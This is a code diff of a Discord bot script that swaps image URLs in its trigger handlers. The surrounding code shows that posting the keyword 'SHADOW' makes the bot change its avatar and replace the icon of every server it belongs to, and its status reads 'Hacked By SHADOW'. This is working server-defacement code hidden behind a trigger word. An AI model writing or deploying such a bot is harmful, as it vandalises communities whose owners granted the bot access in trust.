@@ -34,7 +34,7 @@ LOka.on("message", message => {
 var x1 = "SHADOW"
 LOka.on('message', message => {
      if (message.content === "SHADOW") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/523840292630298636/523840379892531220/download.jpg`)
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
  
 }
 });
@@ -57,7 +57,7 @@ LOka.user.setGame(`Hacked By SHADOW`,'https://www.twitch.tv/hix')
 LOka.on('message', message => {
      if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/523840292630298636/523840379892531220/download.jpg`)
+             m.setIcon(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
 })
 }
 });
@@ -73,7 +73,7 @@ LOka.on('message', message => {
      if (message.content === "SHADOW") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/523840292630298636/523840379892531220/download.jpg`)
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/519891078502154250/526371167586746388/JPEG_20181029_124219.jpg`)
  
 }
 });
